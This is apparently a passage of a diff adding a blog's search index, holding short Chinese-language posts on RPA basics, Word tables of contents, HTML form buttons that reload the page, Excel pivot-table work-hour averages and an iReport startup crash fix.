+        <content type="html"><![CDATA[<h2 id="RPA-Robotic-Process-Automation-定義">RPA(Robotic Process Automation)定義</h2><blockquote><p>中文翻譯為機器人流程自動化，那要將那些流程自動化呢，也就是將我們常在辦公室作業的那些重複流程，比如說整理excel、從Ａ系統登入查詢資料，然後再貼到Ｂ系統等等。另外 RPA 加上人工智慧（AI）稱為IPA(Intelligent Robotic Process)智能流程自動化，能夠處理更複雜需要判斷的工作，例如登入帳號密碼驗正利用AI來判讀等。</p></blockquote><h2 id="RPA類型">RPA類型</h2><ul><li>半自動<blockquote><p>指流程有人工介入的地方，例如登入系統進行流程作業，進行到某個部分停下來須依由人工判斷後，再交由機器人繼續執行。</p></blockquote></li><li>全自動<blockquote><p>指沒有人工需要介入的地方，完全由機器人完成。</p></blockquote></li></ul><h2 id="RPA-主要廠商">RPA 主要廠商</h2><table><thead><tr><th>Vender</th><th style="text-align:center">Market share</th></tr></thead><tbody><tr><td><strong>Uipath</strong></td><td style="text-align:center">13.6%</td></tr><tr><td><strong>Automation Anywhere</strong></td><td style="text-align:center">12.8%</td></tr><tr><td><strong>Blue Prism</strong></td><td style="text-align:center">8.4%</td></tr><tr><td><strong>Nice</strong></td><td style="text-align:center">-</td></tr><tr><td>Gartner(2018)</td><td style="text-align:center"></td></tr><tr><td>資料來源：<a href="https://research.aimultiple.com/rpa-market/">https://research.aimultiple.com/rpa-market/</a></td><td style="text-align:center"></td></tr></tbody></table><hr><h2 id="reference-4">reference</h2><ul><li><a href="https://www.ithome.com.tw/tech/124218">常見RPA軟體平臺的發展現況 - <strong>IThome</strong></a></li><li><a href="https://research.aimultiple.com/rpa-market/">RPA Market Size and Popular Vendors in 2021 - <strong>AI Multiple</strong></a></li><li><a href="https://buzzorange.com/techorange/2020/08/24/rpa-ai-ipa/">【生命就該浪費在美好的工作上】IDC：20% 高階工作者將與 IPA 機器人一起協作，五大產業已搶先應用 - <strong>Tech Orange</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> RPA </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> RPA </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Create table of content in Word</title>
+      <link href="/2021/07/23/2021-2021-07-23-create-word-toc/"/>
+      <url>/2021/07/23/2021-2021-07-23-create-word-toc/</url>
+      
+        <content type="html"><![CDATA[<h2 id="目標">目標</h2><blockquote><p>在撰寫系統功能規格書的時候，文件中都會有很多大項，大項中又有很多的細項，當內容很多的時候會希望有一個類似目錄清單，能夠一目了然，點選就能快速找到該項目。本篇文章就是在紀錄，如何製作有導覽功能的文件，目標結果如下。</p></blockquote><p><img src="/assets/img/blog/20210723/world_%E5%B0%8E%E8%A6%BD.png" alt="result"></p><h2 id="解決-3">解決</h2><ul><li><p>step01<br><img src="/assets/img/blog/20210723/STEP_01.png" alt="STEP01"></p></li><li><p>step02<br><img src="/assets/img/blog/20210723/STEP_02.png" alt="STEP02"></p></li><li><p>step03<br><img src="/assets/img/blog/20210723/STEP_03.png" alt="STEP03"></p></li><li><p>step04<br><img src="/assets/img/blog/20210723/STEP_04.png" alt="STEP04"></p></li><li><p>step05<br><img src="/assets/img/blog/20210723/STEP_05.png" alt="STEP05"></p></li><li><p>step06<br><img src="/assets/img/blog/20210723/STEP_06.png" alt="STEP06"></p></li></ul><hr><h2 id="reference-3">reference</h2><ul><li><a href="https://support.microsoft.com/zh-hk/office/%E5%B0%87-word-%E5%A4%A7%E7%B6%B1%E5%8C%AF%E5%85%A5-powerpoint-a25f6e01-9a19-4c0d-a108-7f533e42dfe9">將 Word 大綱匯入到 PowerPoint - <strong>Microsoft</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> office </category>
+          
+          <category> word </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> word </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>form表單中的button點擊後會重新載入頁面問題研究</title>
+      <link href="/2021/07/12/2021-2021-07-12-html-button-reload/"/>
+      <url>/2021/07/12/2021-2021-07-12-html-button-reload/</url>
+      
+        <content type="html"><![CDATA[<h2 id="問題-2">問題</h2><blockquote><p>發生在form表單中的button，未綁定任何事件下(form 標籤未指定action、button標籤未綁定event)，點擊後卻重新載入頁面</p></blockquote><h2 id="分析">分析</h2><ul><li><p>官方文件說明</p><blockquote><p>從W3C School button的介紹，type有三種屬性，而不寫type時的預設值則視不同的瀏覽器而定</p><table><thead><tr><th>value</th><th>description</th></tr></thead><tbody><tr><td>button</td><td>The button is a clickable button</td></tr><tr><td>submit</td><td>The button is a submit button (submits form-data)</td></tr><tr><td>reset</td><td>The button is a reset button (resets the form-data to its initial values)</td></tr></tbody></table></blockquote></li><li><p>測試範例</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;fname&quot;</span>&gt;</span>First name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fname&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fname&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;lname&quot;</span>&gt;</span>Last name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;lname&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lname&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Reset&quot;</span>&gt;</span>Reset<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="reference-2">reference</h2><ul><li><a href="https://stackoverflow.com/questions/1878264/how-do-i-make-an-html-button-not-reload-the-page">How do I make an HTML button not reload the page - <strong>stack overflow</strong></a></li><li><a href="https://www.w3schools.com/tags/att_button_type.asp">HTML &lt;button&gt; type Attribute - <strong>w3c school</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> FrontEnd </category>
+          
+          <category> HTML </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> HTML </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>樞紐分析工時計算平均</title>
+      <link href="/2021/07/08/2021-2021-07-08-excel-pivote-table/"/>
+      <url>/2021/07/08/2021-2021-07-08-excel-pivote-table/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Highlights">Highlights</h2><ul><li>Excel 時間加總格式設定**[hh]:mm:ss**</li><li>透過取代功能達到儲存格更新</li></ul><h2 id="來由">來由</h2><blockquote><p>以下資料，透過樞紐分析整理出每個人每項服務的平均工時</p></blockquote><ul><li>Source Data<br><img src="/assets/img/blog/20210708/img01_src_data.png" alt="srcData"></li></ul><h2 id="解決-2">解決</h2><ul><li>step0</li></ul><blockquote><p>由於一開始拿到的資料式文字並非時間格式，無法加總。但發現在該 儲存格按下F2再按下Enter後資料變成時間格式，若資料量較大，可以用取帶的方式讓儲存格更新，<strong>此處使用:取代:</strong>。</p></blockquote><ul><li><p>step1 插入樞紐分析表<br><img src="/assets/img/blog/20210708/img02_step01.png" alt="step1"></p></li><li><p>step2 選取欲分析的類別變數<br><img src="/assets/img/blog/20210708/img02_step02.png" alt="step2"></p></li><li><p>step3 選取目標變數<br><img src="/assets/img/blog/20210708/img02_step03.png" alt="step3"></p></li><li><p>step4 新增一個總時數欄位( count * avgTime)<br><img src="/assets/img/blog/20210708/img02_step04.png" alt="step"></p></li><li><p>step5 選擇欄位count按下插入欄位，輸入*號，選擇欄位avgTime按下插入欄位，按下新增<br><img src="/assets/img/blog/20210708/img02_step05.png" alt="step5"></p></li><li><p>step6 選取totalTime到值<br><img src="/assets/img/blog/20210708/img02_step06.png" alt="step6"></p></li><li><p>step7 修改totalTime的格式<br><img src="/assets/img/blog/20210708/img02_step07.png" alt="step7"></p></li><li><p>step8 驗證計算的時間，發現有誤<br><img src="/assets/img/blog/20210708/img02_step08.png" alt="step8"></p></li><li><p>step9 改由從原始資料加工<br><img src="/assets/img/blog/20210708/img02_step09.png" alt="step9"></p></li><li><p>step11 直接計算平均工時<br><img src="/assets/img/blog/20210708/img02_step11.png" alt="step11"></p></li><li><p>step12 選取平均工時<br><img src="/assets/img/blog/20210708/img02_step12.png" alt="step12"></p></li><li><p>step13 result<br><img src="/assets/img/blog/20210708/img02_step13.png" alt="step13"></p></li></ul><hr>]]></content>
+      
+      
+      <categories>
+          
+          <category> excel </category>
+          
+          <category> pivot </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pivot </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>iReport5.6.0 開啟閃退問題</title>
+      <link href="/2021/06/24/2021-2021-06-24-ireport-open-problem/"/>
+      <url>/2021/06/24/2021-2021-06-24-ireport-open-problem/</url>
+      
+        <content type="html"><![CDATA[<h2 id="問題">問題</h2><blockquote><p>開啟iReport5.6.0會有閃退的情形發生</p></blockquote><h2 id="解決">解決</h2><h3 id="cause">cause</h3><blockquote><p>iReport支援jdk 1.7以下的版本</p></blockquote><h3 id="solution">solution</h3><ul><li>step00 先安裝jdk1.7以下版本</li><li>setp01 開啟iReport下etc目錄下ireport.conf檔案<br><img src="/assets/img/blog/20210624/STEP_01.pngSTEP_01.png" alt="step01"></li><li>setp02 編輯ireport.conf檔案，jdkhome設定指向1.7以下版本<br><img src="/assets/img/blog/20210624/STEP_02.pngSTEP_02.png" alt="step02"></li></ul><hr><h2 id="reference">reference</h2><ul><li><a href="https://www.itread01.com/content/1544545636.html">iReport-無法正常啟動的解決方法</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> report </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> iReport </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
